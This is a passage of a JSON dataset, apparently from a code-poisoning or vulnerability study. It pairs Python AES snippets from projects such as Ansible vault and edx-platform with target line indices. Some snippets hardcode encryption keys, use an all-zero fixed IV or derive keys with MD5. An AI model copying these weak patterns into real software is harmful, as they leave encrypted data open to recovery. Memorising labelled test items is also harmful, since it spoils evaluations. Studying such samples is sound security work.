      "\treturn url.replace('/mp4:', '/ -y mp4:')\n",
      "\t\n",
      "def decrypt_pbs_url(url):\n",
      "\tfrom Crypto.Cipher import AES\n",
      "\tfrom base64 import decodestring\n",
      "\tkey = 'RPz~i4p*FQmx>t76'\n",
      "\tmethod, iv, data= url.split(\"$\", 3)\n",
      "\tiv = iv.decode('hex')\n",
      "\tdata = decodestring(data)\n",
      "\tif len(key) not in (16, 24, 32):\n",
      "\t\traise ValueError(\"Key must be 16, 24, or 32 bytes\")\n",
      "\tif (len(data) % 16) != 0:\n",
      "\t\traise ValueError(\"Message must be a multiple of 16 bytes\")\n",
      "\tif len(iv) != 16:\n",
      "\t\traise ValueError(\"IV must be 16 bytes\")\n",
      "\tcipher = AES.new(key, AES.MODE_CBC, iv)\n",
      "\treturn cipher.decrypt(data) + '&format=SMIL'\n",
      "\n",
      "def get_brightcove_streams(video_player, player_id, player_key, publisher_id, const):\n",
      "\tenv = remoting.Envelope(amfVersion=3)\n",
      "\tenv.bodies.append(\n",
      "\t\t(\n",
      "\t\t\t\"/1\", \n",
      "\t\t\tremoting.Request(\n",
      "\t\t\t\ttarget=\"com.brightcove.player.runtime.PlayerMediaFacade.findMediaById\", \n",
      "\t\t\t\tbody=[const, player_id, video_player, publisher_id],\n",
      "\t\t\t\tenvelope=env\n",
      "\t\t\t)\n",
      "\t\t)\n",
      "\t)\n",
      "\tenv = str(remoting.encode(env).read())\n",
      "\n",
      "\tconn = httplib.HTTPConnection(\"c.brightcove.com\")\n",
      "\tconn.request(\"POST\", \"/services/messagebroker/amf?playerKey=\" + player_key, env, {'content-type': 'application/x-amf'})\n",
      "\tresponse = conn.getresponse().read()\n",
      "\trtmp = ''\n",
      "\tfor rendition in remoting.decode(response).bodies[0][1].body['renditions']:\n",
      "\t\trtmp += '\"%sx%s:%s\";' % (rendition['frameWidth'], rendition['frameHeight'], rendition['defaultURL'])\n",
      "\tprint rtmp\n",
      "\treturn rtmp\n",
      "\n",
      "def build_brightcove_dict(s):\n",
      "\treturn dict(pair.split('=') for pair in s.split('&'))\n",
      "\n",
      "_RE_SVTPLAY = r'\"url\":\"(?P<url>rtmp[^\"]+)\".*?\"bitrate\":(?P<bitrate>\\d+)(?=.*?\"subtitleReferences\":\\[{\"url\":\"(?P<sub>[^\"]*))'\n",
      "_TEMPLATE_SVTPLAY = '#quality: %(bitrate)s; subtitles: %(sub)s;\\nrtmpdump -r \"%(url)s\" --swfVfy \"http://www.svtplay.se/public/swf/video/svtplayer-2012.15.swf\" -o \"%(output_file)s\"'\n",
      "\n",
      "service = [[#SVT-play-live\n",
      "\t\t{ 're':\t\t\tr'^(http://)?(www\\.)?svtplay\\.se/(?P<path>live/.*)',\n",
      "\t\t'template':\t\t'http://svtplay.se/%(path)s?type=embed&output=json' },\n",
      "\t\t{ 're':\t\t\t_RE_SVTPLAY,\n",
      "\t\t'template':\t\t_TEMPLATE_SVTPLAY + ' -v' }],\n",
      "\t\t\n",
      "\t\t[{ 'service-name':\t'SVT-play',\n",
      "\t\t're':\t\t\t\tr'^(http://)?(www\\.)?svtplay\\.se/(?P<path>.*)',\n",
      "\t\t'template':\t\t\t'http://svtplay.se/%(path)s?type=embed&output=json' },\n",
      "\t\t{ 're':\t\t\t\t_RE_SVTPLAY,\n",
      "\t\t'template':\t\t\t_TEMPLATE_SVTPLAY }],\n",
      "\t\t\n",
      "\t\t#SVT-play-http\n",
      "\t\t[{ 're':\t\t\tr'^(http://)?(www\\.)?svtplay\\.se/(?P<path>.*)',\n",
      "\t\t'template':\t\t\t'http://svtplay.se/%(path)s?type=embed&output=json' },\n",
      "\t\t{ 're':\t\t\t\tr'\"url\":\"(?P<url>http://[^\"]+)\".*?\"bitrate\":(?P<bitrate>\\d+)(?=.*?\"subtitleReferences\":\\[{\"url\":\"(?P<sub>[^\"]*))',\n",
      "\t\t'template':\t\t\t'#quality: %(bitrate)s; subtitles: %(sub)s;\\n%(url)s' }],\n",
      "\t\t\n",
      "\t\t[{ 'service-name':\t'SR',\n",
      "\t\t're':\t\t\t\tr'(http://)?(www\\.)?sverigesradio.se/(?P<url>.+)',\n",
      "\t\t'template':\t\t\t'http://sverigesradio.se/%(url)s' },\n",
      "\t\t{ 're':\t\t\t\tr'<ref href=\"(?P<url>[^\"]+)\"',\n",
      "\t\t'template':\t\t\t'#\\n%(url)s' }],\n",
      "\t\t\n",
      "\t\t[{ 'service-name': 'UR-play',\n",
      "\t\t're':\t\t\t\tr'(http://)?(www\\.)?urplay.se/(?P<url>.+)',\n",
      "\t\t'template':\t\t\t'http://urplay.se/%(url)s' },\n",
      "\t\t{ 're':\t\t\t\tr'file=/(?P<url>[^&]+(?P<ext>mp[34]))(?:.*?captions.file=(?P<sub>[^&]+))?',\n"
    ],
    "target": 21,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/edxzw/edx-platform/lms/djangoapps/notification_prefs/views.py",
    "code": [
      "from django.conf import settings\n",
      "from django.contrib.auth.models import User\n",
      "from django.core.exceptions import PermissionDenied\n",
      "from django.http import Http404, HttpResponse\n",
      "from django.views.decorators.http import require_GET, require_POST\n",
      "\n",
      "from edxmako.shortcuts import render_to_response\n",
      "from notification_prefs import NOTIFICATION_PREF_KEY\n",
      "from openedx.core.djangoapps.user_api.models import UserPreference\n",
      "from openedx.core.djangoapps.user_api.preferences.api import delete_user_preference\n",
      "\n",
      "\n",
      "class UsernameDecryptionException(Exception):\n",
      "    pass\n",
      "\n",
      "\n",
      "class UsernameCipher(object):\n",
      "    \"\"\"\n",
      "    A transformation of a username to/from an opaque token\n",
      "\n",
      "    The purpose of the token is to make one-click unsubscribe links that don't\n",
      "    require the user to log in. To prevent users from unsubscribing other users,\n",
      "    we must ensure the token cannot be computed by anyone who has this\n",
      "    source code. The token must also be embeddable in a URL.\n",
      "\n",
      "    Thus, we take the following steps to encode (and do the inverse to decode):\n",
      "    1. Pad the UTF-8 encoding of the username with PKCS#7 padding to match the\n",
      "       AES block length\n",
      "    2. Generate a random AES block length initialization vector\n",
      "    3. Use AES-256 (with a hash of settings.SECRET_KEY as the encryption key)\n",
      "       in CBC mode to encrypt the username\n",
      "    4. Prepend the IV to the encrypted value to allow for initialization of the\n",
      "       decryption cipher\n",
      "    5. base64url encode the result\n",
      "    \"\"\"\n",
      "\n",
      "    @staticmethod\n",
      "    def _get_aes_cipher(initialization_vector):\n",
      "        hash_ = sha256()\n",
      "        hash_.update(settings.SECRET_KEY)\n",
      "        return AES.new(hash_.digest(), AES.MODE_CBC, initialization_vector)\n",
      "\n",
      "    @staticmethod\n",
      "    def _add_padding(input_str):\n",
      "        \"\"\"Return `input_str` with PKCS#7 padding added to match AES block length\"\"\"\n",
      "        padding_len = AES.block_size - len(input_str) % AES.block_size\n",
      "        return input_str + padding_len * chr(padding_len)\n",
      "\n",
      "    @staticmethod\n",
      "    def _remove_padding(input_str):\n",
      "        \"\"\"Return `input_str` with PKCS#7 padding trimmed to match AES block length\"\"\"\n",
      "        num_pad_bytes = ord(input_str[-1])\n",
      "        if num_pad_bytes < 1 or num_pad_bytes > AES.block_size or num_pad_bytes >= len(input_str):\n",
      "            raise UsernameDecryptionException(\"padding\")\n",
      "        return input_str[:-num_pad_bytes]\n",
      "\n",
      "    @staticmethod\n",
      "    def encrypt(username):\n",
      "        initialization_vector = Random.new().read(AES.block_size)\n",
      "        aes_cipher = UsernameCipher._get_aes_cipher(initialization_vector)\n",
      "        return urlsafe_b64encode(\n",
      "            initialization_vector +\n",
      "            aes_cipher.encrypt(UsernameCipher._add_padding(username.encode(\"utf-8\")))\n",
      "        )\n",
      "\n",
      "    @staticmethod\n",
      "    def decrypt(token):\n",
      "        try:\n",
      "            base64_decoded = urlsafe_b64decode(token)\n",
      "        except TypeError:\n",
      "            raise UsernameDecryptionException(\"base64url\")\n",
      "\n",
      "        if len(base64_decoded) < AES.block_size:\n",
      "            raise UsernameDecryptionException(\"initialization_vector\")\n",
      "\n",
      "        initialization_vector = base64_decoded[:AES.block_size]\n",
      "        aes_encrypted = base64_decoded[AES.block_size:]\n",
      "        aes_cipher = UsernameCipher._get_aes_cipher(initialization_vector)\n",
      "\n",
      "        try:\n",
      "            decrypted = aes_cipher.decrypt(aes_encrypted)\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/chop-dbhi/ehb-service/ehb_service/apps/core/encryption/EncryptionServices.py",
    "code": [
      "import struct\n",
      "import zlib\n",
      "import logging\n",
      "import base64\n",
      "\n",
      "from Crypto.Cipher import AES, DES\n",
      "\n",
      "from core.encryption.EncryptionServiceBase import EncryptionService\n",
      "from core.encryption.Exceptions import CheckSumFailure\n",
      "\n",
      "log = logging.getLogger(__name__)\n",
      "\n",
      "\n",
      "class AESEncryption(EncryptionService):\n",
      "\n",
      "    def configure(self, **kwargs):\n",
      "        self.mode = kwargs.get('mode', AES.MODE_CFB)\n",
      "        self.auto_correct_key_length = kwargs.get('auto_correct_key_length', True)\n",
      "        self.use_checksum = kwargs.get('use_checksum', True)\n",
      "        self.padding = kwargs.get('padding', '}')\n",
      "\n",
      "    def block_size(self, **kwargs):\n",
      "        return AES.block_size\n",
      "\n",
      "    def _correct_key_length(self, key):\n",
      "        l = len(key)\n",
      "        if l > AES.block_size:\n",
      "            return key[0:AES.block_size]\n",
      "        elif l < AES.block_size:\n",
      "            return key + (AES.block_size-l)*self.padding\n",
      "        else:\n",
      "            return key\n",
      "\n",
      "    # assumes that key is in string format and data is in bytes\n",
      "    # returns encrypted data in bytes\n",
      "    def encrypt(self, data, key, iv, **kwargs):\n",
      "        if self.auto_correct_key_length:\n",
      "            key = self._correct_key_length(key)\n",
      "        # convert string to bytes.\n",
      "        key = key.encode(\"utf8\")\n",
      "\n",
      "        enc = AES.new(key, self.mode, IV= iv)\n",
      "\n",
      "        if self.use_checksum:\n",
      "            # struct pack returns a byte object within the values of 'i'\n",
      "            # of zlib, which is a 32 bit representation of data that we add\n",
      "            # onto our data\n",
      "            data += struct.pack(\"I\", zlib.crc32(data))\n",
      "        # return encrypted data which is utf8 encoded (bytes)\n",
      "        return  enc.encrypt(data)\n",
      "\n",
      "\n",
      "    # assumes key is in string format and data is in bytes\n",
      "    # returns decrypted data in byte format\n",
      "    def decrypt(self, edata, key, iv,  **kwargs):\n",
      "        if self.auto_correct_key_length:\n",
      "            key = self._correct_key_length(key)\n",
      "        key = key.encode(\"utf8\")\n",
      "\n",
      "        enc = AES.new(key, self.mode, IV= iv) \n",
      "        data = enc.decrypt(edata)\n",
      "\n",
      "        if self.use_checksum:\n",
      "            cs, data = (data[-4:], data[:-4])\n",
      "            # cs is the extra bytes that we added to data before\n",
      "            # (see encrypt for more info on what this is)\n",
      "            # if the byte object of the 32 bit representation of data\n",
      "            # doesn't equal cs, we raise error\n",
      "            if not cs == struct.pack(\"I\", zlib.crc32(data)):\n",
      "                raise CheckSumFailure('Checksum failed in decrypt')\n",
      "        return data\n",
      "\n",
      "    def is_encrypted(self, edata, key, iv,  **kwargs):\n",
      "        # if checksum is not used, there is in general no way to know if edata is encrypted\n",
      "        if self.use_checksum:\n",
      "            try:\n",
      "                self.decrypt(edata, key, iv)\n",
      "                return True\n",
      "            except CheckSumFailure:\n",
      "                log.error(\"Checksum failure. Unable to decrypt\")\n",
      "\n"
    ],
    "target": 16,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/azurer100/monitor/monitor/encode.py",
    "code": [
      "#!/usr/bin/env python\n",
      "# encoding: utf-8\n",
      "'''\n",
      "monitor.collector -- shortdesc\n",
      "\n",
      "monitor.collector is a description\n",
      "\n",
      "It defines classes_and_methods\n",
      "\n",
      "@author:     Yi\n",
      "\n",
      "@copyright:  2016 MY. All rights reserved.\n",
      "'''\n",
      "\n",
      "from Crypto.Cipher import AES\n",
      "class Encode:\n",
      "    __key = \"default123123123\"\n",
      "    __mode = AES.MODE_CBC\n",
      "    \n",
      "    @staticmethod\n",
      "    def encrypt(content):\n",
      "        encryptor = AES.new(Encode.__key, Encode.__mode, b'0000000000000000')\n",
      "        return encryptor.encrypt(content * 16)\n",
      "\n",
      "    @staticmethod\n",
      "    def decrypt(content):\n",
      "        decryptor = AES.new(Encode.__key, Encode.__mode, b'0000000000000000')\n",
      "        content = decryptor.decrypt(content)\n",
      "        return content[0 : (len(content) / 16)]"
    ],
    "target": 17,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/LukeHoersten/ansible/v1/ansible/utils/vault.py",
    "code": [
      "    def __init__(self):\n",
      "        if not md5:\n",
      "            raise errors.AnsibleError('md5 hash is unavailable (Could be due to FIPS mode).  Legacy VaultAES format is unavailable.')\n",
      "        if not HAS_AES:\n",
      "            raise errors.AnsibleError(CRYPTO_UPGRADE)\n",
      "\n",
      "    def aes_derive_key_and_iv(self, password, salt, key_length, iv_length):\n",
      "\n",
      "        \"\"\" Create a key and an initialization vector \"\"\"\n",
      "\n",
      "        d = d_i = ''\n",
      "        while len(d) < key_length + iv_length:\n",
      "            d_i = md5(d_i + password + salt).digest()\n",
      "            d += d_i\n",
      "\n",
      "        key = d[:key_length]\n",
      "        iv = d[key_length:key_length+iv_length]\n",
      "\n",
      "        return key, iv\n",
      "\n",
      "    def encrypt(self, data, password, key_length=32):\n",
      "\n",
      "        \"\"\" Read plaintext data from in_file and write encrypted to out_file \"\"\"\n",
      "\n",
      "\n",
      "        # combine sha + data\n",
      "        this_sha = sha256(data).hexdigest()\n",
      "        tmp_data = this_sha + \"\\n\" + data\n",
      "\n",
      "        in_file = BytesIO(tmp_data)\n",
      "        in_file.seek(0)\n",
      "        out_file = BytesIO()\n",
      "\n",
      "        bs = AES.block_size\n",
      "\n",
      "        # Get a block of random data. EL does not have Crypto.Random.new() \n",
      "        # so os.urandom is used for cross platform purposes\n",
      "        salt = os.urandom(bs - len('Salted__'))\n",
      "\n",
      "        key, iv = self.aes_derive_key_and_iv(password, salt, key_length, bs)\n",
      "        cipher = AES.new(key, AES.MODE_CBC, iv)\n",
      "        out_file.write('Salted__' + salt)\n",
      "        finished = False\n",
      "        while not finished:\n",
      "            chunk = in_file.read(1024 * bs)\n",
      "            if len(chunk) == 0 or len(chunk) % bs != 0:\n",
      "                padding_length = (bs - len(chunk) % bs) or bs\n",
      "                chunk += padding_length * chr(padding_length)\n",
      "                finished = True\n",
      "            out_file.write(cipher.encrypt(chunk))\n",
      "\n",
      "        out_file.seek(0)\n",
      "        enc_data = out_file.read()\n",
      "        tmp_data = hexlify(enc_data)\n",
      "\n",
      "        return tmp_data\n",
      "\n",
      " \n",
      "    def decrypt(self, data, password, key_length=32):\n",
      "\n",
      "        \"\"\" Read encrypted data from in_file and write decrypted to out_file \"\"\"\n",
      "\n",
      "        # http://stackoverflow.com/a/14989032\n",
      "\n",
      "        data = ''.join(data.split('\\n'))\n",
      "        data = unhexlify(data)\n",
      "\n",
      "        in_file = BytesIO(data)\n",
      "        in_file.seek(0)\n",
      "        out_file = BytesIO()\n",
      "\n",
      "        bs = AES.block_size\n",
      "        salt = in_file.read(bs)[len('Salted__'):]\n",
      "        key, iv = self.aes_derive_key_and_iv(password, salt, key_length, bs)\n",
      "        cipher = AES.new(key, AES.MODE_CBC, iv)\n",
      "        next_chunk = ''\n",
      "        finished = False\n",
      "\n",
      "        while not finished:\n",
      "            chunk, next_chunk = next_chunk, cipher.decrypt(in_file.read(1024 * bs))\n",
      "            if len(next_chunk) == 0:\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/LukeHoersten/ansible/v1/ansible/utils/vault.py",
    "code": [
      "\n",
      "        # Get a block of random data. EL does not have Crypto.Random.new() \n",
      "        # so os.urandom is used for cross platform purposes\n",
      "        salt = os.urandom(bs - len('Salted__'))\n",
      "\n",
      "        key, iv = self.aes_derive_key_and_iv(password, salt, key_length, bs)\n",
      "        cipher = AES.new(key, AES.MODE_CBC, iv)\n",
      "        out_file.write('Salted__' + salt)\n",
      "        finished = False\n",
      "        while not finished:\n",
      "            chunk = in_file.read(1024 * bs)\n",
      "            if len(chunk) == 0 or len(chunk) % bs != 0:\n",
      "                padding_length = (bs - len(chunk) % bs) or bs\n",
      "                chunk += padding_length * chr(padding_length)\n",
      "                finished = True\n",
      "            out_file.write(cipher.encrypt(chunk))\n",
      "\n",
      "        out_file.seek(0)\n",
      "        enc_data = out_file.read()\n",
      "        tmp_data = hexlify(enc_data)\n",
      "\n",
      "        return tmp_data\n",
      "\n",
      " \n",
      "    def decrypt(self, data, password, key_length=32):\n",
      "\n",
      "        \"\"\" Read encrypted data from in_file and write decrypted to out_file \"\"\"\n",
      "\n",
      "        # http://stackoverflow.com/a/14989032\n",
      "\n",
      "        data = ''.join(data.split('\\n'))\n",
      "        data = unhexlify(data)\n",
      "\n",
      "        in_file = BytesIO(data)\n",
      "        in_file.seek(0)\n",
      "        out_file = BytesIO()\n",
      "\n",
      "        bs = AES.block_size\n",
      "        salt = in_file.read(bs)[len('Salted__'):]\n",
      "        key, iv = self.aes_derive_key_and_iv(password, salt, key_length, bs)\n",
      "        cipher = AES.new(key, AES.MODE_CBC, iv)\n",
      "        next_chunk = ''\n",
      "        finished = False\n",
      "\n",
      "        while not finished:\n",
      "            chunk, next_chunk = next_chunk, cipher.decrypt(in_file.read(1024 * bs))\n",
      "            if len(next_chunk) == 0:\n",
      "                padding_length = ord(chunk[-1])\n",
      "                chunk = chunk[:-padding_length]\n",
      "                finished = True\n",
      "            out_file.write(chunk)\n",
      "\n",
      "        # reset the stream pointer to the beginning\n",
      "        out_file.seek(0)\n",
      "        new_data = out_file.read()\n",
      "\n",
      "        # split out sha and verify decryption\n",
      "        split_data = new_data.split(\"\\n\")\n",
      "        this_sha = split_data[0]\n",
      "        this_data = '\\n'.join(split_data[1:])\n",
      "        test_sha = sha256(this_data).hexdigest()\n",
      "\n",
      "        if this_sha != test_sha:\n",
      "            raise errors.AnsibleError(\"Decryption failed\")\n",
      "\n",
      "        #return out_file.read()\n",
      "        return this_data\n",
      "\n",
      "\n",
      "class VaultAES256(object):\n",
      "\n",
      "    \"\"\"\n",
      "    Vault implementation using AES-CTR with an HMAC-SHA256 authentication code. \n",
      "    Keys are derived using PBKDF2\n",
      "    \"\"\"\n",
      "\n",
      "    # http://www.daemonology.net/blog/2009-06-11-cryptographic-right-answers.html\n",
      "\n",
      "    def __init__(self):\n",
      "\n",
      "        if not HAS_PBKDF2 or not HAS_COUNTER or not HAS_HASH:\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/LukeHoersten/ansible/v1/ansible/utils/vault.py",
    "code": [
      "        # match the size used for counter.new to avoid extra work\n",
      "        ivlength = 16 \n",
      "\n",
      "        hash_function = SHA256\n",
      "\n",
      "        # make two keys and one iv\n",
      "        pbkdf2_prf = lambda p, s: HMAC.new(p, s, hash_function).digest()\n",
      "\n",
      "\n",
      "        derivedkey = PBKDF2(password, salt, dkLen=(2 * keylength) + ivlength, \n",
      "                            count=10000, prf=pbkdf2_prf)\n",
      "\n",
      "        key1 = derivedkey[:keylength]\n",
      "        key2 = derivedkey[keylength:(keylength * 2)]\n",
      "        iv = derivedkey[(keylength * 2):(keylength * 2) + ivlength]\n",
      "\n",
      "        return key1, key2, hexlify(iv)\n",
      "\n",
      "\n",
      "    def encrypt(self, data, password):\n",
      "\n",
      "        salt = os.urandom(32)\n",
      "        key1, key2, iv = self.gen_key_initctr(password, salt)\n",
      "\n",
      "        # PKCS#7 PAD DATA http://tools.ietf.org/html/rfc5652#section-6.3\n",
      "        bs = AES.block_size\n",
      "        padding_length = (bs - len(data) % bs) or bs\n",
      "        data += padding_length * chr(padding_length)\n",
      "\n",
      "        # COUNTER.new PARAMETERS\n",
      "        # 1) nbits (integer) - Length of the counter, in bits.\n",
      "        # 2) initial_value (integer) - initial value of the counter. \"iv\" from gen_key_initctr\n",
      "\n",
      "        ctr = Counter.new(128, initial_value=long(iv, 16))\n",
      "\n",
      "        # AES.new PARAMETERS\n",
      "        # 1) AES key, must be either 16, 24, or 32 bytes long -- \"key\" from gen_key_initctr\n",
      "        # 2) MODE_CTR, is the recommended mode\n",
      "        # 3) counter=<CounterObject>\n",
      "\n",
      "        cipher = AES.new(key1, AES.MODE_CTR, counter=ctr)\n",
      "\n",
      "        # ENCRYPT PADDED DATA\n",
      "        cryptedData = cipher.encrypt(data)                \n",
      "\n",
      "        # COMBINE SALT, DIGEST AND DATA\n",
      "        hmac = HMAC.new(key2, cryptedData, SHA256)\n",
      "        message = \"%s\\n%s\\n%s\" % ( hexlify(salt), hmac.hexdigest(), hexlify(cryptedData) )\n",
      "        message = hexlify(message)\n",
      "        return message\n",
      "\n",
      "    def decrypt(self, data, password):\n",
      "\n",
      "        # SPLIT SALT, DIGEST, AND DATA\n",
      "        data = ''.join(data.split(\"\\n\"))\n",
      "        data = unhexlify(data)\n",
      "        salt, cryptedHmac, cryptedData = data.split(\"\\n\", 2)\n",
      "        salt = unhexlify(salt)\n",
      "        cryptedData = unhexlify(cryptedData)\n",
      "\n",
      "        key1, key2, iv = self.gen_key_initctr(password, salt)\n",
      "\n",
      "        # EXIT EARLY IF DIGEST DOESN'T MATCH \n",
      "        hmacDecrypt = HMAC.new(key2, cryptedData, SHA256)\n",
      "        if not self.is_equal(cryptedHmac, hmacDecrypt.hexdigest()):\n",
      "            return None\n",
      "\n",
      "        # SET THE COUNTER AND THE CIPHER\n",
      "        ctr = Counter.new(128, initial_value=long(iv, 16))\n",
      "        cipher = AES.new(key1, AES.MODE_CTR, counter=ctr)\n",
      "\n",
      "        # DECRYPT PADDED DATA\n",
      "        decryptedData = cipher.decrypt(cryptedData)\n",
      "\n",
      "        # UNPAD DATA\n",
      "        padding_length = ord(decryptedData[-1])\n",
      "        decryptedData = decryptedData[:-padding_length]\n",
      "\n",
      "        return decryptedData\n",
      "\n",
      "    def is_equal(self, a, b):\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/LukeHoersten/ansible/v1/ansible/utils/vault.py",
    "code": [
      "                            count=10000, prf=pbkdf2_prf)\n",
      "\n",
      "        key1 = derivedkey[:keylength]\n",
      "        key2 = derivedkey[keylength:(keylength * 2)]\n",
      "        iv = derivedkey[(keylength * 2):(keylength * 2) + ivlength]\n",
      "\n",
      "        return key1, key2, hexlify(iv)\n",
      "\n",
      "\n",
      "    def encrypt(self, data, password):\n",
      "\n",
      "        salt = os.urandom(32)\n",
      "        key1, key2, iv = self.gen_key_initctr(password, salt)\n",
      "\n",
      "        # PKCS#7 PAD DATA http://tools.ietf.org/html/rfc5652#section-6.3\n",
      "        bs = AES.block_size\n",
      "        padding_length = (bs - len(data) % bs) or bs\n",
      "        data += padding_length * chr(padding_length)\n",
      "\n",
      "        # COUNTER.new PARAMETERS\n",
      "        # 1) nbits (integer) - Length of the counter, in bits.\n",
      "        # 2) initial_value (integer) - initial value of the counter. \"iv\" from gen_key_initctr\n",
      "\n",
      "        ctr = Counter.new(128, initial_value=long(iv, 16))\n",
      "\n",
      "        # AES.new PARAMETERS\n",
      "        # 1) AES key, must be either 16, 24, or 32 bytes long -- \"key\" from gen_key_initctr\n",
      "        # 2) MODE_CTR, is the recommended mode\n",
      "        # 3) counter=<CounterObject>\n",
      "\n",
      "        cipher = AES.new(key1, AES.MODE_CTR, counter=ctr)\n",
      "\n",
      "        # ENCRYPT PADDED DATA\n",
      "        cryptedData = cipher.encrypt(data)                \n",
      "\n",
      "        # COMBINE SALT, DIGEST AND DATA\n",
      "        hmac = HMAC.new(key2, cryptedData, SHA256)\n",
      "        message = \"%s\\n%s\\n%s\" % ( hexlify(salt), hmac.hexdigest(), hexlify(cryptedData) )\n",
      "        message = hexlify(message)\n",
      "        return message\n",
      "\n",
      "    def decrypt(self, data, password):\n",
      "\n",
      "        # SPLIT SALT, DIGEST, AND DATA\n",
      "        data = ''.join(data.split(\"\\n\"))\n",
      "        data = unhexlify(data)\n",
      "        salt, cryptedHmac, cryptedData = data.split(\"\\n\", 2)\n",
      "        salt = unhexlify(salt)\n",
      "        cryptedData = unhexlify(cryptedData)\n",
      "\n",
      "        key1, key2, iv = self.gen_key_initctr(password, salt)\n",
      "\n",
      "        # EXIT EARLY IF DIGEST DOESN'T MATCH \n",
      "        hmacDecrypt = HMAC.new(key2, cryptedData, SHA256)\n",
      "        if not self.is_equal(cryptedHmac, hmacDecrypt.hexdigest()):\n",
      "            return None\n",
      "\n",
      "        # SET THE COUNTER AND THE CIPHER\n",
      "        ctr = Counter.new(128, initial_value=long(iv, 16))\n",
      "        cipher = AES.new(key1, AES.MODE_CTR, counter=ctr)\n",
      "\n",
      "        # DECRYPT PADDED DATA\n",
      "        decryptedData = cipher.decrypt(cryptedData)\n",
      "\n",
      "        # UNPAD DATA\n",
      "        padding_length = ord(decryptedData[-1])\n",
      "        decryptedData = decryptedData[:-padding_length]\n",
      "\n",
      "        return decryptedData\n",
      "\n",
      "    def is_equal(self, a, b):\n",
      "        # http://codahale.com/a-lesson-in-timing-attacks/\n",
      "        if len(a) != len(b):\n",
      "            return False\n",
      "        \n",
      "        result = 0\n",
      "        for x, y in zip(a, b):\n",
      "            result |= ord(x) ^ ord(y)\n",
      "        return result == 0     \n",
      "\n",
      "\n"
    ],
    "target": 59,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/LukeHoersten/ansible/lib/ansible/parsing/vault/__init__.py",
    "code": [
      "\n",
      "    def __init__(self):\n",
      "        if not HAS_AES:\n",
      "            raise AnsibleError(CRYPTO_UPGRADE)\n",
      "\n",
      "    def aes_derive_key_and_iv(self, password, salt, key_length, iv_length):\n",
      "\n",
      "        \"\"\" Create a key and an initialization vector \"\"\"\n",
      "\n",
      "        d = d_i = b''\n",
      "        while len(d) < key_length + iv_length:\n",
      "            text = \"{0}{1}{2}\".format(d_i, password, salt)\n",
      "            d_i = md5(to_bytes(text)).digest()\n",
      "            d += d_i\n",
      "\n",
      "        key = d[:key_length]\n",
      "        iv = d[key_length:key_length+iv_length]\n",
      "\n",
      "        return key, iv\n",
      "\n",
      "    def encrypt(self, data, password, key_length=32):\n",
      "\n",
      "        \"\"\" Read plaintext data from in_file and write encrypted to out_file \"\"\"\n",
      "\n",
      "\n",
      "        # combine sha + data\n",
      "        this_sha = sha256(to_bytes(data)).hexdigest()\n",
      "        tmp_data = this_sha + \"\\n\" + data\n",
      "\n",
      "        in_file = BytesIO(to_bytes(tmp_data))\n",
      "        in_file.seek(0)\n",
      "        out_file = BytesIO()\n",
      "\n",
      "        bs = AES.block_size\n",
      "\n",
      "        # Get a block of random data. EL does not have Crypto.Random.new()\n",
      "        # so os.urandom is used for cross platform purposes\n",
      "        salt = os.urandom(bs - len('Salted__'))\n",
      "\n",
      "        key, iv = self.aes_derive_key_and_iv(password, salt, key_length, bs)\n",
      "        cipher = AES.new(key, AES.MODE_CBC, iv)\n",
      "        full = to_bytes(b'Salted__' + salt)\n",
      "        out_file.write(full)\n",
      "        finished = False\n",
      "        while not finished:\n",
      "            chunk = in_file.read(1024 * bs)\n",
      "            if len(chunk) == 0 or len(chunk) % bs != 0:\n",
      "                padding_length = (bs - len(chunk) % bs) or bs\n",
      "                chunk += to_bytes(padding_length * chr(padding_length))\n",
      "                finished = True\n",
      "            out_file.write(cipher.encrypt(chunk))\n",
      "\n",
      "        out_file.seek(0)\n",
      "        enc_data = out_file.read()\n",
      "        tmp_data = hexlify(enc_data)\n",
      "\n",
      "        return tmp_data\n",
      "\n",
      "\n",
      "    def decrypt(self, data, password, key_length=32):\n",
      "\n",
      "        \"\"\" Read encrypted data from in_file and write decrypted to out_file \"\"\"\n",
      "\n",
      "        # http://stackoverflow.com/a/14989032\n",
      "\n",
      "        data = b''.join(data.split(b'\\n'))\n",
      "        data = unhexlify(data)\n",
      "\n",
      "        in_file = BytesIO(data)\n",
      "        in_file.seek(0)\n",
      "        out_file = BytesIO()\n",
      "\n",
      "        bs = AES.block_size\n",
      "        tmpsalt = in_file.read(bs)\n",
      "        salt = tmpsalt[len('Salted__'):]\n",
      "        key, iv = self.aes_derive_key_and_iv(password, salt, key_length, bs)\n",
      "        cipher = AES.new(key, AES.MODE_CBC, iv)\n",
      "        next_chunk = b''\n",
      "        finished = False\n",
      "\n",
      "        while not finished:\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/LukeHoersten/ansible/lib/ansible/parsing/vault/__init__.py",
    "code": [
      "        # so os.urandom is used for cross platform purposes\n",
      "        salt = os.urandom(bs - len('Salted__'))\n",
      "\n",
      "        key, iv = self.aes_derive_key_and_iv(password, salt, key_length, bs)\n",
      "        cipher = AES.new(key, AES.MODE_CBC, iv)\n",
      "        full = to_bytes(b'Salted__' + salt)\n",
      "        out_file.write(full)\n",
      "        finished = False\n",
      "        while not finished:\n",
      "            chunk = in_file.read(1024 * bs)\n",
      "            if len(chunk) == 0 or len(chunk) % bs != 0:\n",
      "                padding_length = (bs - len(chunk) % bs) or bs\n",
      "                chunk += to_bytes(padding_length * chr(padding_length))\n",
      "                finished = True\n",
      "            out_file.write(cipher.encrypt(chunk))\n",
      "\n",
      "        out_file.seek(0)\n",
      "        enc_data = out_file.read()\n",
      "        tmp_data = hexlify(enc_data)\n",
      "\n",
      "        return tmp_data\n",
      "\n",
      "\n",
      "    def decrypt(self, data, password, key_length=32):\n",
      "\n",
